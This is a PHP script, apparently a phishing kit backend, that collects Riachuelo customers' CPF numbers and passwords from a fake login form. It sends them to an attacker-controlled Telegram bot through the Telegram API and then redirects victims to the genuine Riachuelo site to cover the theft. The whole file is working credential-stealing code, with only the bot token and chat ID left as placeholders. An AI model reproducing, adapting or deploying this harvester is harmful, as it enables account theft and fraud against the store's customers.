<?php

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    
    if (isset($_GET['username']) && isset($_GET['password'])) {

        $conteudo = "+1 | Login Riachuelo colhido\n\n";
        $conteudo .= "🪪 | CPF: " . $_GET['username'] . "\n";
        $conteudo .= "🔐 | SENHA: " . $_GET['password'] . "\n\n";
        $conteudo .= "📆 | DATA/HORA: " . date('Y-m-d H:i:s') . "\n\n";

        $botToken = 'TOKEN DO SEU BOT';
        $chatId = 'SEU ID';

        $mensagem = urlencode($conteudo);

        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";

        $response = file_get_contents($url);

        if ($response !== false) {
            header('Location: https://www.riachuelo.com.br/cliente');
            exit();
        } else {
            echo "Ocorreu um erro ao enviar a mensagem. Por favor, revise suas informações.";
        }
    } else {
        echo "200";
    }
} else {
    header('Location: https://www.riachuelo.com.br/cliente');
    exit();
}

?>
